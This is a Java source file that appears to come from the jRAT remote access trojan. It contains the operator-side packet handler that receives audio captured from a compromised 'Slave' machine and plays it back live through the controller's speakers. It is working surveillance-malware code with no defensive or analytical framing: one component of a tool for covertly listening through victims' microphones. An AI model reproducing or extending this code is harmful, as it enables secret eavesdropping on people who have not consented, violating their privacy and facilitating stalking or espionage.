package io.jrat.client.packets.incoming;

import io.jrat.client.Slave;
import io.jrat.client.ui.dialogs.DialogRemoteSoundCapture;

import java.io.DataInputStream;

import javax.sound.sampled.AudioFormat;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.DataLine;
import javax.sound.sampled.SourceDataLine;


public class Packet58SoundCapture extends AbstractIncomingPacket {

	public static final AudioFormat format = new AudioFormat(AudioFormat.Encoding.PCM_SIGNED, 44100, 16, 2, 4, 44100, false);
	private static DataLine.Info info;
	private static SourceDataLine line;

	private static boolean initialized;

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		DialogRemoteSoundCapture frame = DialogRemoteSoundCapture.instances.get(slave);
		if (!initialized) {
			info = new DataLine.Info(SourceDataLine.class, format);
			if (!AudioSystem.isLineSupported(info)) {
				throw new Exception("Sound line is not supported");
			}
			line = (SourceDataLine) AudioSystem.getLine(info);
			line.open(format);
			line.start();
			initialized = true;
		}

		int size = slave.readInt();

		byte[] data = new byte[size];

		slave.getDataInputStream().readFully(data);

		if (frame != null && frame.isRunning()) {
			line.write(data, 0, data.length);
		}
	}

	public void close() {
		if (line != null) {
			line.close();
		}
	}

}
